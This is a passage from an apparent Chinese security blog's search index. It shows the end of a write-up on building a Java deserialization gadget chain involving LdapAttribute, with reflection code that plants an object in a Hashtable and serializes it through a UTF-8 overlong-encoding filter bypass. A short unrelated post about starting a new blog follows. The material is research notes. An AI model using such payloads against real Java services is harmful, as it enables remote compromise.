hashTable.put(<span class="number">1</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tableField</span> <span class="operator">=</span> Hashtable.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">        tableField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object[] table = (Object[]) tableField.get(hashTable);</span><br><span class="line">        <span class="keyword">for</span> (Object entry: table)&#123;</span><br><span class="line">            <span class="keyword">if</span> (entry != <span class="literal">null</span>)&#123;</span><br><span class="line">                ReflectUtil.setFieldValue(entry,<span class="string">&quot;key&quot;</span>,typedValue);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = SerializeUtil.serializeBypass(hashTable);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        SerializeUtil.deserialize(bytes);</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里反射构造对象的时候需要手动指定<code>LdapAttribute</code>的父类为<code>BasicAttribute</code>.<br>然而在实际打的时候发现了一个问题,<code>UTF8OverlongEncoding</code>bypass后还是带naming,这是由于进行Overlong Bypass使用的工具类只对<code>TC_CLASSDESC</code>进行了处理导致的.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">StreamHeader</span><br><span class="line">  -&gt; magic <span class="title function_">number</span> <span class="params">(<span class="number">0xAC</span> ED)</span></span><br><span class="line">  -&gt; version (<span class="number">0x00</span> <span class="number">05</span>)</span><br><span class="line"></span><br><span class="line">Content (多个对象内容)</span><br><span class="line">  -&gt; TC_OBJECT</span><br><span class="line">    -&gt; classDesc</span><br><span class="line">      -&gt; TC_CLASSDESC</span><br><span class="line">        -&gt; className (UTF写入)</span><br><span class="line">        -&gt; serialVersionUID</span><br><span class="line">        -&gt; flags</span><br><span class="line">        -&gt; fieldDesc (字段信息)</span><br><span class="line">        -&gt; classAnnotations</span><br><span class="line">        -&gt; superClassDesc</span><br><span class="line">    -&gt; values</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以参考<a href="https://whoopsunix.com/docs/PPPYSO/advance/UTFMIX/">这篇文章</a>去手动处理,但是懒了,留到下次组会(?</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>为什么要换新博客</title>
      <link href="/2025/04/21/hello-world/"/>
      <url>/2025/04/21/hello-world/</url>
      
        <content type="html"><![CDATA[<p>自信安国赛败于天津后，决心开始一条全新的学习道路。<br>过往种种，皆为云烟；此后岁月，俱是纤尘。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
